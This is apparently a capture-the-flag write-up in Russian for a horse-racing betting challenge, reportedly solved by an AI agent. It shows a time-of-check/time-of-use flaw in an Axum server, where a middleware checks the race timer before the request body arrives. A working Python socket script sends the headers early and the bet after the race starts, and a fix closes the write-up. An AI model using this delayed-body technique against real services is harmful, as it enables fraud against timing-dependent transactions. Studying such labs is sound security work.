# Horse Racing: ставка через заголовки до старта и тело после старта

[English](solve.md)

## 0. Что нужно сделать

Стартуем с **10 очками**, а VIP-флаг открывается при **500 очках**. На скачках 16 лошадей; до старта можно ставить, во время забега видно их положение. Одна успешная ставка всем банком удваивает очки.

Проблема в том, что победителя можно почти уверенно определить только после начала гонки, а новый `POST /api/bet` тогда должен быть запрещён. Мы обошли эту проверку **без изменения времени и без гонки за mutex**: отправили HTTP-заголовки до закрытия приёма ставок, а тело с выбранной лошадью — после того, как фаворит стал виден.

## 1. Порядок исполнения в main.rs

Маршрут устроен так:

```rust
.route(
    "/api/bet",
    post(bet).route_layer(middleware::from_fn_with_state(
        state.clone(), betting_open
    )),
)
```

Middleware:

```rust
async fn betting_open(
    State(state): State<SharedState>,
    request: Request,
    next: Next,
) -> Result<Response, (StatusCode, String)> {
    if state.read().await.timer >= 30 {
        return Err((StatusCode::BAD_REQUEST, "Race already started".to_string()));
    }
    Ok(next.run(request).await)
}
```

А сам обработчик принимает `Json<BetRequest>`, и значит должен дочитать HTTP-тело **после** прохождения middleware:

```rust
async fn bet(
    State(state): State<SharedState>,
    Json(bet_request): Json<BetRequest>,
) -> Result<StatusCode, (StatusCode, String)> {
    let mut state = state.write().await;
    // проверяет ставку и баланс, но НЕ проверяет timer
}
```

Граница проверки неправильная. В состоянии `timer<30` middleware уже пропускает Request к следующему слою. Если JSON ещё не пришёл, `Json` будет ждать тело. Когда оно придёт после `timer>=30`, обработчик не перепроверит время и примет позднюю ставку.

Уязвимость — **TOCTOU между валидацией заголовков HTTP-запроса и фактическим выполнением ставки после получения тела**.

## 2. Как определить лидера

В `race_loop` при `timer==30` выбирается `favorite` случайным индексом 0–15. Далее каждую секунду лошади получают добавку:

```rust
let base = rand::random_range(0.0..=3.0);
let speed = if h == state.favorite { base * 2.0 } else { base };
state.horses[h] += speed;
```

`favorite` прямо не публикуется в `/api/state`, но массив `horses:[f32;16]` опубликован и обновляется каждую секунду. У фаворита математическое ожидание скорости вдвое выше, чем у остальных, поэтому после существенного накопления пути он обычно уже лидирует.

Агент использовал контрольный порог:

```text
lead_position >= 50
lead_position - second_position >= 10
```

Это **не математическая гарантия победы**, а прагматический фильтр для увеличения надёжности. Поскольку случайные скорости продолжаются, лидер может измениться. Но в сохранённом живом отчёте все шесть необходимых гонок завершились удачно.

## 3. Как удержать запрос «между слоями»

Рабочий HTTP-приём:

```http
POST /api/bet HTTP/1.1
Host: <host>
Content-Type: application/json
Content-Length: 80
Connection: close

```

После пустой строки открываем **другое** соединение к `GET /api/state`, но на первом соединении тело не отправляем.

Почему `Content-Length: 80`: заранее сообщает серверу, сколько байт надо ждать. Мы можем позднее прислать короткий JSON, дополненный ASCII-пробелами ровно до 80 байт. Пробелы после JSON допустимы.

```python
import json

def make_body(horse, amount):
    raw = json.dumps({"horse":horse,"amount":amount},separators=(",",":")).encode()
    assert len(raw) <= 80
    return raw.ljust(80, b" ")
```

Не нужно пытаться угадать победителя до старта или менять `timer`. Требуется лишь оставить неоконченным уже пропущенный middleware запрос.

## 4. Пример воспроизведения протокола

Ниже минимальный Python-фрагмент, **восстановленный по исходнику и прямому отчёту**, а не оригинальный потерянный файл `horse.py`:

```python
import socket, json, time, requests

def one_race(host, port, stake):
    # Открыть заранее, пока timer < 30.
    sock = socket.create_connection((host,port), timeout=10)
    headers = (
        f"POST /api/bet HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: 80\r\n"
        "Connection: close\r\n\r\n"
    ).encode()
    sock.sendall(headers)

    while True:
        state = requests.get(f"http://{host}:{port}/api/state", timeout=5).json()
        positions = state["horses"]
        best = sorted(range(16), key=lambda i: positions[i], reverse=True)
        if state["timer"] >= 30 and positions[best[0]] >= 50 \
                and positions[best[0]] - positions[best[1]] >= 10:
            horse = best[0]
            break
        time.sleep(0.3)

    body = json.dumps({"horse": horse, "amount": stake},
                      separators=(",",":")).encode().ljust(80,b" ")
    sock.sendall(body)
    response = sock.recv(4096)
    sock.close()
    return horse, response
```

Окно для отправки `body` должно предшествовать финишу. Состояние и скорость меняются, так что скрипту нужны корректные таймауты, обработка перезапуска гонки и повторный запуск при проигрыше. Здесь показано только ядро HTTP-трюка, не выдаём его за полноценный боевой драйвер с восстановлением банка.

## 5. Реальный журнал результата

Задача в Git-мосте: `task_017f331919afce30dc698e0cfcd7cebd`, отчёт агента `mt-20261113-horseracing-report`:

1. TCP: заголовки `POST /api/bet` при `timer<30`; body задержано.
2. Наблюдение за позициями через `GET /api/state` до `lead>=50` и отрыва >=10.
3. Досылка JSON до 80 байт при `timer>=30`.
4. Сервер ответил **HTTP 200**, хотя забег уже шёл.
5. Баланс после выигрышных гонок: **10 → 20 → 40 → 80 → 160 → 320 → 640** примерно за семь минут.
6. При `user_points>=500` поле `vip` в `/api/state` содержало флаг, который платформа приняла.

В архиве есть `src/main.rs` и короткий журнал сдачи флага. **Сам сокетный скрипт не упакован**, а изложение этапов 1–6 взято из реального сообщения агента.

## 6. Почему другие идеи были не нужны

Обсуждались обходы через NaN/аргумент индекса и гонка блокировок `RwLock`, однако они не потребовались. Решение использовало не изменение коэффициента и не переполнение счёта, а неправильный момент проверки. Важный технический нюанс: Axum/HTTP-соединение должно действительно пропускать заголовки к middleware до полного тела; прокси, полностью буферизующий request body, сломал бы эту атаку. В живом инстансе такой буферизации не было.

## 7. Как исправить

Перенести проверку `timer < 30` внутрь `bet` **после** `Json<BetRequest>` и делать её под тем же write-lock, под которым списываются очки. Тогда проверка и изменение игрового состояния становятся одной атомарной операцией. Одного middleware, проверяющего состояние до приёма тела, недостаточно.
